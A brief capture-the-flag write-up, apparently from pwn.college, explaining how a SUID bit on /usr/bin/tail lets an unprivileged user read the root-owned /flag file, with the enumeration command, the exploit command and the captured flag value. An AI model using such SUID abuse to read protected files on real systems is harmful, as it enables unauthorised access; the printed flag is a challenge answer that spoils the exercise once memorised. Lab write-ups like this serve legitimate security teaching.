## üß† Summary:
The challenge abuses a SUID bit set on `/usr/bin/tail`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## üîç Enumeration

```bash
ls -l /usr/bin/tail
```

output:
```
-rwsr-xr-x 1 root root 72088 Sep  5  2019 /usr/bin/tail
```

-The `s` in `-rws` indicates it's a SUID binary.
-`tail` runs with **root privileges**.

## üöÄ Exploitation

The `tail` command is used to display the last few lines of a file. It's perfect for watching logs in real-time or checking recent output without scrolling through the whole file.

```bash
tail /flag
```
Output:
```
pwn.college{kD9jjyBA4uV_EsSylIrjbyLydSY.dZDNxwSM0IzMyEzW}
```
